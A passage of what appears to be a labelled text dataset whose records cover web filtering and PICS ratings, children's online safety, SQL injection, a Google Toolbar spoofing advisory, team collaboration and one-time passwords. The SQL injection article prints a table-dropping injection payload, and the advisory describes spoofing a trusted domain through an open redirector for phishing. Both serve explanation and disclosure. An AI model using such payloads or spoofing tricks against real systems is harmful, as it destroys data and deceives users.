block, software vendors cannot hope to identify all sites that meet their blocking criteria. Furthermore, since new web sites are constantly appearing, even regular updates from the software vendor will not block out all adult web sites. Each updated list will be obsolete as soon as it is released, as any as any site that appears after the update will not be on the list, and will not be blocked. The volatility of individual sites is yet another potential cause of trouble. Adult material might be added to (or removed from) a site soon after the site is added to (or removed from) a list of blocked sites.\nBlocking lists also raise problems by withholding information from users, who may or may not have access to information describing the criteria used to block web sites. While some vendors provide descriptions of their blocking criteria, this information is often vague or incomplete. Several vendors have extended blocking beyond merely \"objectionable\" materials. In some instances, political sites and sites that criticize blocking software have been blocked.\nThis obscurity is compounded by practices used to protect these lists of blocked sites. Vendors often consider these lists to be proprietary intellectual property, which they protect through mathematical encryption, which renders the lists incomprehensible to end users. As a result, users are unable to examine which sites are blocked and why. This arbitrary behavior demeans the user's role as an active, thoughtful participant in their use of the Internet.\nKeyword searches cannot use contextual information. While searches can identify the presence of certain words in a text, they cannot evaluate the context in which those words are used. For example, a search might find the word \"breast\" on a web page, but it cannot determine whether that word was used in a chicken recipe, an erotic story, or in some other manner. In one notable incident, America Online's keyword searches blocked a breast cancer support group.\nKeyword searches cannot interpret graphics. It is not currently possible to \"search\" the contents of a picture. Therefore, a page containing sexually explicit pictures will be blocked only if the text on that page contains one or more words from the list of words to be blocked.\nThe Massachusetts Institute of Technology's World Wide Web Consortium has developed a set of technical standards called PICS (Platform for Internet Content Selection) so that people can electronically distribute descriptions of digital works in a simple, computer-readable form. Computers can process these labels in the background, automatically shielding users from undesirable material or directing their attention to sites of particular interest. The original impetus for PICS was to allow parents and teachers to screen materials they felt were inappropriate for children using the Net. Rather than censoring what is distributed, as the Communications Decency Act and other legislative initiatives have tried to do, PICS enables users to control what they receive.There are two components involved in the practical use of PICS: ratings systems, and software that uses ratings systems to filter content.\nPICS-based software uses an alternative approach based on distributed sharing of ratings information. Instead of using blocking lists or keyword searches, programs that use PICS use standardized \"ratings systems\" to determine which sites should be blocked. Available from software vendors or from Internet sites, these ratings systems are be used to describe the content of Internet sites (see question 3.7 for a description of how PICS works in practice). Users of PICS-based software are usually given the ability to choose which ratings system they would like to use.\nAs an open standard, PICS can be used for a wide range of applications. In addition to providing a means for blocking content deemed unsuitable for children, PICS might also be used for describing content in terms of its educational content, potential for violations of privacy, or any other criteria that involve rating of Internet sites.\nIn some senses, programs that use PICS are much more flexible than stand-alone filtering software. Users of PICS software are not tied to the judgments of the software vendor, and the descriptions of the criteria used by the ratings systems are publicly available. However, users are currently limited to choosing between a small number of ratings systems, each of which has its own biases and viewpoints. Users that disagree with the popular ratings systems may be unable to use PICS in a manner that fits their needs and viewpoints.\nA rating is a description of some particular Internet content, using the terms and vocabulary of some ratings system.\nSelf-Rating: Web site publishers can evaluate their own content and put PICS rating information directly into their web pages. Currently, this evaluation can be done through Web pages provided by developers of the major ratings services.\nThird-Party Ratings: Interested third parties can use PICS ratings systems to evaluate web sites and publish their own ratings for these sites. Educational groups, religious groups, or individuals can rate sites and publish these ratings on the Internet for users to access.\nYour browser software may influence choice of ratings service. If you use Microsoft's Internet Explorer, you only have one choice (RSACi) built in to the initial distribution. To use other ratings services, IE users must download files from the 'Net and install them on their PCs.\nCurrently (as of September 1997), there are three PICS services that are being widely used or promoted:\nRSACi: Sponsored by the Recreational Software Advisory Council (known for ratings on video games), RSACi is probably the most widely used PICS ratings system in use today. RSACi's ratings categories include violence, nudity, sex, and language, with 5 ratings within each category. As of September 1997, RSACi claims to have over 43,000 sites rated.\nSafeSurf: Developed by the SafeSurf corporation, this system's categories include \"Age Range,\" \"Profanity,\" \"Heterosexual Themes,\" \"Homosexual Themes,\" \"Nudity,\" \"Violence,\" \"Sex, Violence, and Profanity, \" \"Intolerance,\" \"Glorifying Drug Use,\" \"Other Adult Themes,\" and \"Gambling,\" with 9 distinctions for each category.\nSafeSurf and RSACi both rely on self-rating of Internet sites by web publishers.\nNetShepherd: Based in Calgary, Net Shepherd rates sites based on quality levels (1-5 stars). Unlike SafeSurf and RSAC, NetShepherd conducts third-party ratings of web sites. They claim to have rated over 300,000 sites. NetShepherd has also announced partnerships with firms such as Altavista and Catholic Telecom, Inc.\nOnce these choices have been made, the browser software uses them to filter sites. When an Internet site is requested, the browser compares the site's rating with the user's selection. If the site has ratings for the chosen system and those ratings fit within the parameters chosen by the user, it is displayed as usual. If the appropriate ratings fall outside of those parameters (perhaps the site has \"frontal nudity,\" while the user was only willing to accept \"partial nudity\"), access to the site is prohibited, and the user is shown a message indicating that the site is blocked.\nSince most web sites are not currently rated, most software provides users with the option of blocking out sites that do not contain PICS ratings.\nIn order to prevent mischievous children from changing ratings or disabling PICS altogether, most browsers can be configured to require a password before disabling PICS.\nRSACi, SafeSurf, and other proponents of ratings would obviously like everyone to rate their sites, while civil libertarians and opponents of ratings argue against any ratings.\nPublishers of family-oriented sites or those who are trying to reach audiences concerned with Internet content might consider rating. Similarly, purveyors of adult material might rate their sites in order to be \"good citizens\".\nIn evaluating ratings systems, publishers may want to examine the categories used by each system and the distinctions used by those categories. Different systems will classify ratings systems in different ways, some of which may misrepresent the content of web sites. For example, sites discussing safe sex might not want to be placed in the same category with pornographic sites.\nWeb site publishers might also consider the popularity of the ratings services. Currently (as of September 1997), there are only a few major ratings services. Publishers are free to user other ratings, but these may not be useful to the Internet users who rely upon the popular systems. This presents a dilemma for some publishers, who can either accept the ratings of the popular systems, even if those ratings misrepresent their material, or refuse to rate their sites, knowing that this might cause their sites to be unavailable to some users.\nVersions of Microsoft's Internet Explorer have provided an extreme example of this problem. Although IE allows user to use any PICS ratings system, RSACi is the only system that is built in to the selection list. Since Internet Explorer is the most widely-used PICS-capable browser (as of fall 1997, Netscape's Navigator does not support PICS), it seems likely that many PICS users will be relying upon RSACi. For publishers interested in reaching a wide audience, this market force may determine their choice of ratings system.\nFinally, philosophical concerns may cause some people to decide not to rate. Web-site publishers who are not comfortable with the general content of available ratings systems, or who object to the concept of ratings, may choose not to rate their own sites.\nMSNBC's troubles with ratings provide an ironic illustration of this possibility. Displeased with the RSACi ratings that would be necessary, MSNBC management removed all rating information from the site. MSNBC and other news organizations briefly discussed the possibility of creating a new ratings system specifically for news reporting.\nWhile this proposal was eventually rejected, it illustrates some of the problems with content ratings. Well-funded publishers like MSNBC might be able to effectively create ratings systems that meet their needs, but smaller publishers who want to rate their sites may be forced to accept unsatisfactory ratings.\nTo make matters worse, third party rating does not require the consent or even notification of a web-site publisher. Since third party ratings are distributed by third party \"label bureaus,\" a web-site publisher may not know if her pages have been rated, or what the ratings said.\nThird-party ratings also present significant technical challenges that may discourage their development. Unlike self-ratings, third party PICS ratings do not reside on publisher's web pages. Instead, they must be distributed to users using one of two methods:\nSome software, such as Microsoft's Internet Explorer, provides users with the option of blocking out any site that does not have a rating. This choice may be appropriate for some, but it severely restricts the available options. By blocking out most of the Web (including possibly some sites designed for younger users), this approach presents children with a severely restricted view of the world.\nThese issues of quality and accountability would become even trickier if numerous schemes were to come into use. If there were dozens of PICS ratings schemes to choose from, publishers would not know which to choose, and users might not know which to trust.\nThe first - and currently the only viable alternative - is to avoid use of PICS for self-rating, and in Internet browsers.\nThe second approach would be to develop a new ratings vocabulary, as an alternative to RSACi, SafeSurf, or other currently available ratings systems. This involves several steps:\nThe first step is generation of a ratings system, including categories that would be discussed and distinctions within those categories. This would require a discussion of the values that will be represented in the ratings system, and how these values should be expressed.\nOnce the system has been developed, sites must be rated. This can be done in one of two ways:\nGiven the significant resources that will be needed to effectively deploy a new ratings system, it seems unlikely that there will be a large number of PICS alternatives available in the near future. The developers of PICS are trying to change this through the PICS Incubator project, which offers resources to organizations interested in developing new ratings systems.\nBook reviews and movie ratings are only two examples of the many ways in which we use information filters. Used in conjunction with other information sources - including advertising and word-of-mouth - these ratings provide a basis for making informed decisions regarding information.\nUnfortunately, PICS does not currently provide users with the contextual information and range of choices necessary for informed decision making. When deciding which movies to see, we have access to reviews, advertisements and trailers which provide information regarding the content. These details help us choose intelligently based on our values and preferences. On the other hand, PICS-based systems do not provide any contextual detail: users are simply told that access to a site is denied because the site's rating exceeds a certain value on the rating scale.\nFurthermore, the limited range of currently available PICS ratings system does not provide users with a meaningful choice between alternatives. Parents who are not comfortable with any of the current ratings systems may not find PICS to be a viable alternative.\nContinuing with our analogies to other media, consider book reviews in a world where only two or three publications reviewed books. This might work very well for people who agree with the opinions of these reviewers (and, of course, for the reviewers themselves!), but it would work very poorly for those who have differing viewpoints.\nSome might argue that the \"success\" of a single set of movie ratings offers a model for PICS. However, ratings are generally applied only to movies made for entertainment by major producers. Documentaries and educational films are generally not rated, but similar web sites could be rated under PICS.\nMovie ratings also provide a cautionary lesson that should be considered with respect to the Internet. Unrated movies, or movies with certain ratings, often have a difficult time reaching audiences, as they may not be shown in certain theaters or carried by large video chains. This has led to self-censorship, as directors trim explicit scenes in order to avoid NC-17 ratings. This may be appropriate for commercially-oriented entertainment, but it could be dangerous when applied to safe-sex information on the Internet.\nRatings systems also fail to account for the global nature of the Internet. Legal or practical pressures aimed at convincing Internet publishers to rate their own sites will have little effect, as these businesses or individuals have the option of simply moving their material to a foreign country. Furthermore, the existing ratings systems are of limited value to those in countries that do not share western values.\nConcerns about unrated international material or differing cultural values could be addressed through direct censorship. For example, governments might use PICS ratings or proprietary filtering software to implement \"national firewalls\" which would screen out objectionable material. Alternatively, ratings might be used to \"punish\" inappropriate speech. If search engines chose to block sites with certain ratings (or unrated sites), or if browsers blocked certain ratings (or lack of ratings) by default, these sites might never be seen.\nIt is possible that a wide range of PICS ratings system could come into use, providing families with a real opportunity to choose ratings that meet their values. The utility of PICS might also be increased by use of new technologies like \"metadata\" (data about data, used to describe the content of web pages and other information resources), which might be used to provide contextual information along with PICS ratings. However, these tools may not be available for general use for some time, if at all.\nSome people confuse ratings with the topical organization that is used in libraries and Web sites like Yahoo. While no system of organization of information is neutral, topical schemes attempt to describe what a resource is \"about\". Rating rarely helps us find information resources topically and is usually too narrowly focused on a few criteria to be useful for information retrieval.\nIf this question is taken to mean: \"Are there any solutions that would provide children with the ability to use the Internet without ever seeing material that is explicit or \"adult,\"the answer is probably yes. This would require a combination of three factors:\nIf the question is interpreted as meaning: \"Are there any solutions that provide some protection from adult or objectionable material without restricting free speech?\" the answer is much less clear. Stand-alone systems clearly don't meet these criteria, as they place users at the whims of software vendors, who may block sites for arbitrary reasons. In theory, PICS might fit this role, but the lack of a meaningful choice between substantially different ratings systems leaves parents and publishers with the choice of using ratings that they may not agree with, or that fail to adequately describe their needs or materials.\nDescribing speech as \"adult\" or \"appropriate for children\" is inherently a tricky and value-laden process. In the U.S., many people have attempted to prevent schools and libraries from using everyday publications like Huckleberry Finn and descriptions of gay/lesbian lifestyles. The fierce debates over these efforts show that no consensus can be reached. Increased use of filtering software would likely be the beginning, rather than the end, of debates regarding what Internet materials are \"appropriate\" for children, and who gets to make that decision.\nSecondly, parents should play an active role and interest in their children's use of the Internet. For some children this might mean restricting Internet use to closely supervised sessions. Other children might be able to work with clearly defined rules and guidelines. To discourage unsupervised use of the Internet, parents might consider measures such as placing the family computer in a common space in the home and retaining adult control over any passwords required for Internet access.\nParents should also work to educate children regarding proper use of the Internet. Just as parents teach children not to talk to strangers on the street, parents might discourage children from visiting certain web sites, divulging personal or family information, or participating in inappropriate chats.\nSome parents might consider using filtering software, despite all of the potential drawbacks. Parents considering this route should closely examine their options, in order to understand their options and the implications of any choice.\nFor stand-alone filtering systems, this means investigating the criteria used in developing blocking lists and/or news reports describing the software. If possible, parents might try to find stand-alone systems that allow users to view and edit the lists of blocked sites.\nParents considering the use of PICS systems should investigate the categories used by the various ratings systems, in order to find one that meets their needs. Information about PICS-based systems can be found at the home pages of the respective ratings systems.\nIn general, the use of a filtering product involves an implicit acceptance of the criteria used to generate the ratings involved. Before making this decision, parents should take care to insure that the values behind the ratings are compatible with their beliefs.\nFinally, parents should realize that the Internet is just a reflection of society in general. Much of the \"adult\" content on the Internet can be found on cable TV, at local video stores, or in movie theaters. Since other media fail to shield children from violence or sexual content, restrictions on the Internet will always be incomplete.\nISP-Based Filtering: ISPs might do the filtering themselves, preventing their customers from accessing objectionable materials, even if those customers do not have their own filtering software. This requires the use of a proxy server, which would serve as a broker between the ISP's customers and remote web sites. When a customer of a filtering ISP wants to see a web site, his request goes to the proxy server operated by the ISP. The proxy server will then check to see if the site should be blocked. If the site is allowable, the proxy server retrieves the web page and returns it to the customer.\nThis approach is technically feasible. In fact, it's currently used by many corporations, and some ISPs that offer this service. However, proxying requires significant computational resources that may be beyond the means of smaller ISPs. Even if the ISP can afford the computers and Internet bandwidth needed, this approach is still far from ideal. In order to do the filtering, proxy servers would have to use stand-alone or PICS-based systems, so they would be subject to the limitations of these technologies (see 2.4, 2.5, and 3.13). The shortcomings of existing filtering systems may prove particularly troublesome for ISPs that advertise filtering services, as these firms could be embarrassed or worse if their filters fail to block adult material. Finally, ISPs that filter material may lose customers who are interested in unfiltered access to the Internet.\nProviding Filtering Software: Others have suggested that ISPs should be required to provide users with filtering software. While this might be welcome by parents who are thinking about getting on to the 'Net (and by software vendors!) it could present a financial serious burden for smaller ISPs.\nMost advocates of the use of blocking software by libraries have forgotten that the public library is a branch of government, and therefore subject to First Amendment rules which prohibit content-based censorship of speech. These rules apply to the acquisition or the removal of Internet content by a library. Secondly, government rules classifying speech by the acceptability of content (in libraries or elsewhere) are inherently suspect, may not be vague or overbroad, and must conform to existing legal parameters laid out by the Supreme Court. Third, a library may not delegate to a private organization, such as the publisher of blocking software, the discretion to determine what library users may see. Fourth, forcing patrons to ask a librarian to turn off blocking software has a chilling effect under the First Amendment.\nThe PICS Incubator Project\nFahrenheit 451.2: Is Cyberspace Burning? - The ACLU's Report on Filtering Software\nThe Censorware Project The Global Internet Liberty Campaign has an excellent page on ratings and filters.\nThe Internet Free Expression Alliance is a coalition of groups working to preserve open expression on the Internet.\nComputer Professionals for Social Responsibility (CPSR)", "label": 1}
{"text": "Caught in the Web: Keeping Your Kids Safe Online\nThe world wide web can be a wide world of sites that you don't want your child or teen stumbling into. Read our guide for navigating internet safety.\nBe Open. Put computers in a high traffic area. Your son/daughter will be less likely to access or post inappropriate content if they know you can see the screen. Consider not allowing your teen to have a data plan on their cell phone.\nAlso, openly communicate with your child. Make sure you know what their interests are and talk to them about what they like to do when they're on the internet.\n. Tell your child they can only join Facebook if you have an account, too.\nMake Clear Rules. Let your child know how long they can stay on the computer, what types of sites they can visit, what software they can use, etc.\nInstall Security Tools. Keep your anti-virus software up-to-date and check your browser's security settings. Not sure what those settings should be? Check out StaySafeOnline.org.\nHere are some other ways to keep your computer safe and secure:\n- Check With Your Internet Service Provider. They may offer special services or programs designed to keep your kids safe online.\n- Install Special Software. There are a variety of tools available that meet a variety of needs. Check out InternetSafety.com for several, family-friendly options that you can customize for your needs.\nAdapted from the Department of Homeland Security's guidelines.\nRelated Articles: Safety", "label": 1}
{"text": "No secret to stopping XSS and SQL injection attacks\nRead, test, communicate, repeat\nSQL injection attacks and cross-site scripting exploits just won't die.\nThe most recent and high-profile incident was a mass webpage attack on more than 100,000 pages, which included victims as diverse as The Wall Street Journal, TomTom, and the UK's Strathclyde police.\nBut none of it would have been possible if the sites involved had been more resilient to SQL injection attacks. This signals a lack of awareness among developers — but we shouldn't just be pointing the finger at them. The problem also comes back to a lack of awareness among testers, who really should be actively testing applications for common security holes as a matter of course.\nBut the problem goes even deeper than that. The current emphasis on unit testing among developers has produced a myopic attitude to testing, in which integration testing — which would help to expose certain security flaws — is seen as too troublesome to bother with.\nThe frustrating thing about SQL injection attacks in particular, though, is that they're so easy to prevent in the first place — and easy to test for, of course.\nTake the following query. Let's say we run a travel website where somebody searches for hotels in Blackpool. The query, constructed in your server code, would look something like:\nSELECT * FROM hotels WHERE city = 'Blackpool';\nIn the search form, the user would enter a town/city. The server component extracts this value from the submitted form, and places it directly into the query.\nGiving effectively free access to the database opens up all sorts of potential for sneaky shenanigans from unscrupulous exploiters. All the user has to do is add their own closing single-quote in the search form, plus some additional gubbins to turn it into a valid query:\nEverything after the -- is treated as a comment, so the door to your data is now wide open. How about if the user types into the search form:\nBlackpool'; DROP TABLE hotels; --\nYour server-side code will faithfully construct this into the following SQL, and pass it straight to the database, which in turn will chug away without question, just following orders:\nSELECT * FROM hotels WHERE city = 'Blackpool'; DROP TABLE hotels; --';\nDepending how malicious the attacker is, they could wreak all sorts of havoc or (worse, in a way) build on the \"base exploit\" to extract other users' passwords from the database. There's a good list of SQL injection examples here.\nNext page: Sanitized for your protection", "label": 1}
{"text": "Google Toolbar allows spoofing the information presented in the dialog which is being displayed when adding a new Google Toolbar button. This can allow an attacker to convince the users that his button comes from a trusted domain. This button can then be used to download malicious files or conduct phishing attacks (e.g. show a login form of a bank).\n- Google Toolbar 5 beta for Internet Explorer\n- Google Toolbar 4 for Internet Explorer\n- Google Toolbar 4 for Firefox (partially)\nGoogle Toolbar provides a nice API for creating toolbar buttons. Basically, the button information is stored in an XML file.\nIn order to add a button, the toolbar user must click on a specially crafted link which refers to the button's XML file. When the user click on the link, a dialog appears with all the following details: The domain where the button is being downloaded from, the name, description and icon of the button and some \"privacy considerations\", which basically shows the domains which the button interacts with (sends/receive information).\nBy creating a specially crafted URLs it is possible for an attacker to fake the domains displayed in the \"Downloaded from\" and \"Privacy considerations\" sections. This specially crafted URL can be created by simply adding an open redirector (e.g. in google.com - http://www.google.com/local_url?q=) before the URL.\nAn attacker can use this vulnerability to gain the victim's trust to add and use the button, and by that the victim will trust the files that the button offer, or enter private information. In the new beta version of the toolbar it is also possible to alert the user every few seconds to click on the button.\nIn the Firefox version of Google Toolbar it is only possible to fake the \"Privacy considerations\" section.\nA proof-of-concept which adds a \"critical update\" button can be found here. Use it at your own risk, though it shouldn't do anything but suggest you to download gupdate.exe from my site, which is basically the windows calculator.\nWorkaround / Suggestion\nGoogle have acknowledged this and are already working on a fix.\nUntil a fixed version is provided, I suggest to avoid adding new buttons to the toolbar.", "label": 1}
{"text": "With almost a billion friends on Facebook, six billion cell phone accounts globally, and twenty billion \"things\" from refrigerators to bridge spans to micro-medical devices soon to be wired by Internet, the digital age is upon us in full force. Everyone and everything is connected or soon will be by social media, on mobile platforms, and in the cloud. That puts vast new arrays of assets in play, from crowds to drones, sensors to shoppers. If teams can leverage those assets, hard and soft, digital and real-world, mass them quickly or marshal them with precision accuracy, teams can gain advantage as never before.\nThe recent Kony2012 viral video offers proof that something special is happening as a result of all this connectedness: digital collaboration has come of age. Garnering 100 million YouTube views in six days the fastest ever to reach that mark Kony2012 demonstrated that digital collaboration can create astounding effects not possible just five years ago.\nAchieving those effects is no accident. While much is made of \"emergent collaboration,\" Kony2012 went viral by design. The Invisible Children, Inc. team that masterminded the campaign comprised veteran media activists and fundraisers pursuing a common enough goal (a criminal's arrest), but using skills and means unique to the digital age: a viral message, built on a 30-minute video, self-replicating among millions of real-world and online partisans across networks.\nEmergent, yes. But no less planned or executed than another viral blockbuster the OMGPOP team's March 2012 breakout of Draw Something, a Pictionary-like game. Three weeks after launch, gamers, Facebook friends and Twitter followers had downloaded the Draw Something app 35 million times, created over one billion pictures and were creating three thousand drawings per second. Close interplay between social and mobile platforms accelerated the effect. Collaboration between OMGPOP and Couchbase, its database partner, assured it. Teams scaled the cloud implementation to handle the massive load without downtime. The result: by late March 2012, Draw Something had 15 million daily players and was the Apple AppStore's #1 word game in 84 countries.\nViral-by-design is a unique effect of digital collaboration. The Invisible Children and the OMGPOP teams each achieved it.\nCan you? Don't stop at viral-by-design. Today, teams can achieve seven further effects unique to collaboration in the digital age. They are the fuel in the engine of the networked world. Each can confer decisive advantage in the marketplace or the school room, the battlespace or the political race. Each is the new work of teams today.\n1. Precision Identity. In the digital world, where you are defines who you are. Everyone has a unique geospatial identity: you and only you were over \"there\" a minute ago and over \"here\" now. Competitors know your customers by the stores they visit payday Fridays and grab their attention and wallet on Thursdays. Strike teams know insurgents by the mud huts they visit, then find and disassemble terrorist networks faster. Precision identity is a capability. Do you have it?\n2. Mass Customization. From Nikes to K-12 curricula, drone strikes to personalized medicines, teams can mass produce unique solutions for anyone. The truly disruptive move in K-12 education, for example, will be personalized curricula uniquely customized student-by-student. Love skateboards? Here's the physics of staying on your deck jumping a 360-degree ollie while riding fakie. Yes, you can download an app for that!\n3. Common Operating Pictures. Dozens of systems and networks tell some of the stories about your firm. None tell the whole story. Now you can line them all up, from social media, consumer insights, competitive intelligence, marketplace measurement, sales, and distribution. Share a total view of performance at a single point in time with partners and colleagues so everyone is on the same page. You won't be the first to get this view. Don't be the last.\n4. Rapid Innovation/Move-to-Market Cycles. \"Collaboration with customers slows me down.\" Wrong: collaboration with customers speeds your move to market. You avoid rework and get value in the hands of users fast. Just ask Steve Ellis, EVP at Wells Fargo, whose team took Wells's wholesale services online in a year. \"Fastest uptake I ever saw,\" he said. The result: spectacular growth in transactions, from $1 trillion to $11 trillion over a decade.\n5. Crowd-Sourced Creation. Whether online (think: Wikipedia) or on the fly (think: Twitter), in design (think: Local Motors' Rally Fighter car) or in finance (think: Kickstarter), millions contributing a little make crowds smarter, richer and happier, faster. Love the crowd; it will love you right back.\n6. Real-Time Situational Awareness. What's going on in the factory across the globe, on the store-shelf across town, or with that crowd straight ahead? You can achieve 360/real-time awareness of your situation now, from remote sensing to location awareness. By the way you already feature in someone else's 360 \"SA\". But you knew that!\n7. Predicting the Future Faster, Sooner. \"Big data\" analytics with real-world guides let you see big-picture patterns and micro-trends with astonishing precision, in time to seize the day or head off disaster. That knack market leaders have for knowing what will happen next, and when? That's by design.\nTransforming effects to results requires strategy, management, and even more collaboration. Barack Obama is President of the United States today because David Plouffe stitched together Obama2008's team of campaign veterans, e-commerce pros, and social media experts. That team achieved all eight digital-age effects, supercharged partisans for age-old purposes raise money, knock on doors, and get out the vote and gained victory on November 4, 2008. \"The big difference this year is not the technology,\" Joe Rospars, the campaign's social media chief said. \"It's the coordination.\"\nEffects alone never guarantee results. Despite Kony2012, Joseph Kony remains free. But make no mistake. There's plenty of room on history's ash heap for those who assume this all happens by chance.\nFor teams that can attain these effects by capability by design watch out, world.\nThis post is part of the HBR Insight Center on The Secrets of Great Teams.", "label": 1}
{"text": "Passwords establish the identity of a user, and they are an essential component of modern information technology. In this article, I describe one-time passwords: passwords that you use once and then never again. Because they’re used only once, you don’t have to remember them. I describe how to implement one-time passwords with a Texas Instruments (TI) eZ430-Chronos wireless development tool in a watch and how to use them to log in to existing web services such as Google Gmail (see Photo 1).\nPhoto 1—The Texas Instruments eZ430 Chronos watch displays a unique code that enables logging into Google Gmail. The code is derived from the current time and a secret value embedded in the watch.\nTo help me get around on the Internet, I use a list of about 80 passwords (at the latest count). Almost any online service I use requires a password: reading e-mail, banking, shopping, checking reservations, and so on. Many of these Internet-based services have Draconian password rules. For example, some sites require a password of at least eight characters with at least two capitals or numbers and two punctuation characters. The sheer number of passwords, and their complexity, makes it impossible to remember all of them.\nWhat are the alternatives? There are three different ways of verifying the identity of a remote user. The most prevailing one, the password, tests something that a user knows. A second method tests something that the user has, such as a secure token. Finally, we can make use of biometrics, testing a unique user property, such as a fingerprint or an eye iris pattern.\nEach of these three methods comes with advantages and disadvantages. The first method (passwords) is inexpensive, but it relies on the user’s memory. The second method (secure token) replaces the password with a small amount of embedded hardware. To help the user to log on, the token provides a unique code. Since it’s possible for a secure token to get lost, it must be possible to revoke the token. The third method (biometrics) requires the user to enroll a biometric, such as a fingerprint. Upon login, the user’s fingerprint is measured again and tested against the enrolled fingerprint. The enrollment has potential privacy issues. And, unlike a secure token, it’s not possible to revoke something that is biometric.\nThe one-time password design in this article belongs to the second category. A compelling motivation for this choice is that a standard, open proposal for one-time passwords is available. The Initiative for Open Authentication (OATH) is an industry consortium that works on a universal authentication mechanism for Internet users. They have developed several proposals for user authentication methods, and they have submitted these to the Internet Engineering Task Force (IETF). I’ll be relying on these proposals to demonstrate one-time passwords using a eZ430-Chronos watch. The eZ430-Chronos watch, which I’ll be using as a secure token, is a wearable embedded development platform with a 16-bit Texas Instruments MSP430 microcontroller.\nONE-TIME PASSWORD LOGON\nFigure 1 demonstrates how one-time passwords work. Let’s assume a user—let’s call him Frank—is about to log on to a server. Frank will generate a one-time password using two pieces of information: a secret value unique to Frank and a counter value that increments after each authentication. The secret, as well as the counter, is stored in a secure token. To transform the counter and the secret into a one-time password, a cryptographic hash algorithm is used. Meanwhile, the server will generate the one-time password it is expecting to see from Frank. The server has a user table that keeps track of Frank’s secret and his counter value. When both the server and Frank obtain the same output, the server will authenticate Frank. Because Frank will use each password only once, it’s not a problem if an attacker intercepts the communication between Frank and the server.\nFigure 1—A one-time password is formed by passing the value of a personal secret and a counter through a cryptographic hash (1). The server obtains Frank’s secret and counter value from a user table and generates the same one-time password (2). The two passwords must match to authenticate Frank (3). After each authentication, Frank’s counter is incremented, ensuring a different password the next time (4).\nAfter each logon attempt, Frank will update his copy of the counter in the secure token. The server, however, will only update Frank’s counter in the user table when the logon was successful. This will intercept false logon attempts. Of course, it is possible that Frank’s counter value in the secure token gets out of sync with Frank’s counter value in the server. To adjust for that possibility, the server will use a synchronization algorithm. The server will attempt a window of counter values before rejecting Frank’s logon. The window chosen should be small (i.e., five). It should only cover for the occasional failed logon performed by Frank. As an alternate mechanism to counter synchronization, Frank could also send the value of his counter directly to the server. This is safe because of the properties of a cryptographic hash: the secret value cannot be computed from the one-time password, even if one knows the counter value.\nYou see that, similar to the classic password, the one-time password scheme still relies on a shared secret between Frank and the server. However, the shared secret is not communicated directly from the user to the server, it is only tested indirectly through the use of a cryptographic hash. The security of a one-time password therefore stands or falls with the security of the cryptographic hash, so it’s worthwhile to look further into this operation.\nA cryptographic hash is a one-way function that calculates a fixed-length output, called the digest, from an arbitrary-length input, called the message. The one-way property means that, given the message, it’s easy to calculate the digest. But, given the digest, one cannot find back the message.\nThe one-way property of a good cryptographic hash implies that no information is leaked from the message into the digest. For example, a small change in the input message may cause a large and seemingly random change in the digest. For the one-time password system, this property is important. It ensures that each one-time password will look very different from one authentication to the next.\nThe one-time password algorithm makes use of the SHA-1 cryptographic hash algorithm. This algorithm produces a digest of 160 bits. By today’s Internet standards, SHA-1 is considered old. It was developed by Ronald L. Rivest and published as a standard in 1995.\nIs SHA-1 still adequate to create one-time passwords? Let’s consider the problem that an attacker must solve to break the one-time password system. Assume an attacker knows the SHA-1 digest of Frank’s last logon attempt. The attacker could now try to find a message that matches the observed digest. Indeed, knowing the message implies knowing a value of Frank’s secret and the counter. Such an attack is called a pre-image attack.\nFortunately, for SHA-1, there are no known (published) pre-image attacks that are more efficient than brute force trying all possible messages. It’s easy to see that this requires an astronomical number of messages values. For a 160-bit digest, the attacker can expect to test on the order of 2160 messages. Therefore it’s reasonable to conclude that SHA-1 is adequate for the one-time password algorithm. Note, however, that this does not imply that SHA-1 is adequate for any application. In another attack model, cryptographers worry about collisions, the possibility of an attacker finding a pair of messages that generate the same digest. For such attacks on SHA-1, significant progress has been made in recent years.\nThe one-time password scheme in Figure 1 combines two inputs into a single digest: a secret key and a counter value. To combine a static, secret key with a variable message, cryptographers use a keyed hash. The digest of a keyed hash is called a message authentication code (MAC). It can be used to verify the identity of the message sender.\nFigure 2 shows how SHA-1 is used in a hash-based message authentication code (HMAC) construction. SHA-1 is applied twice. The first SHA-1 input is a combination of the secret key and the input message. The resulting digest is combined again with the secret key, and SHA-1 is then used to compute the final MAC. Each time, the secret key is mapped into a block of 512 bits. The first time, it is XORed with a constant array of 64 copies of the value 0×36. The second time, it is XORed with a constant array of 64 copies of the value 0x5C.\nFigure 2—The SHA-1 algorithm on the left is a one-way function that transforms an arbitrary-length message into a 160-bit fixed digest. The Hash-based message authentication code (HMAC) on the right uses SHA-1 to combine a secret value with an arbitrary-length message to produce a 160-bit message authentication code (MAC).\nTHE HOTP ALGORITHM\nWith the HMAC construction, the one-time password algorithm can now be implemented. In fact, the HMAC can almost be used as is. The problem with using the MAC itself as the one-time password is that it contains too many bits. The secure token used by Frank does not directly communicate with the server. Rather, it shows a one-time password Frank needs to type in. A 160-bit number requires 48 decimal digits, which is far too long for a human.\nOATH has proposed the Hash-based one-time password (HOTP) algorithm. HOTP uses a key (K) and a counter (C). The output of HOTP is a six-digit, one-time password called the HOTP value. It is obtained as follows. First, compute a 160-bit HMAC value using K and C. Store this result in an array of 20 bytes, hmac, such that hmac contains the 8 leftmost bits of the 160-bit HMAC string and hmac contains the 8 rightmost bits. The HOTP value is then computed with a snippet of C code (see Listing 1).\nListing 1—C code used to compute the HTOP value\nThere is now an algorithm that will compute a six-digit code starting from a K value and a C value. HOTP is described in IETF RFC 4226. A typical HOTP implementation would use a 32-bit C and an 80-bit K.\nAn interesting variant of HOTP, which I will be using in my implementation, is the time-based one-time password (TOTP) algorithm. The TOTP value is computed in the same way as the HOTP value. However, the C is replaced with a timestamp value. Rather than synchronizing a C between the secure token and the server, TOTP simply relies on the time, which is the same for the server and the token. Of course, this requires the secure token to have access to a stable and synchronized time source, but for a watch, this is a requirement that is easily met.\nThe timestamp value chosen for TOTP is the current Unix time, divided by a factor d. The current Unix time is the number of seconds that have elapsed since midnight January 1, 1970, Coordinated Universal Time. The factor d compensates for small synchronization differences between the server and the token. For example, a value of 30 will enable a 30-s window for each one-time password. The 30-s window also gives a user sufficient time to type in the one-time password before it expires.\nIMPLEMENTATION IN THE eZ430-CHRONOS WATCH\nI implemented the TOTP algorithm on the eZ430-Chronos watch. This watch contains a CC430F6137 microcontroller, which has 32 KB of flash memory for programs and 4,096 bytes of RAM for data. The watch comes with a set of software applications to demonstrate its capabilities. Software for the watch can be written in C using TI’s Code Composer Studio (CCStudio) or in IAR Systems’s IAR Embedded Workbench.\nThe software for the eZ430-Chronos watch is structured as an event-driven system that ties activities performed by software to events such 